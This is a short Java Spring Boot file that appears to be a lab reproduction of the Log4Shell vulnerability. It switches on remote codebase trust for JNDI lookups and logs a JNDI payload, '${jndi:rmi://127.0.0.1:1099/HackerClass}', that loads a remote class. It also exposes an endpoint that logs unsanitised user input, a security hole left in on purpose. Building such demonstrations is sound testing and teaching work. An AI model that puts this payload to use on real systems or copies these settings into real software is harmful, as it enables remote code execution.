package com.example.l4jbug;


import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


@SpringBootApplication
public class L4jbugApplication {
    private static Logger log = LogManager.getLogger();

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "true");
        log.error("${jndi:rmi://127.0.0.1:1099/HackerClass}");
        SpringApplication.run(L4jbugApplication.class, args);
    }
}

@RestController
@RequestMapping("/")
class TestController {
    private static Logger log = LogManager.getLogger();

    @GetMapping("/")
    public void whatever(String name) {
        log.error(name);
    }
}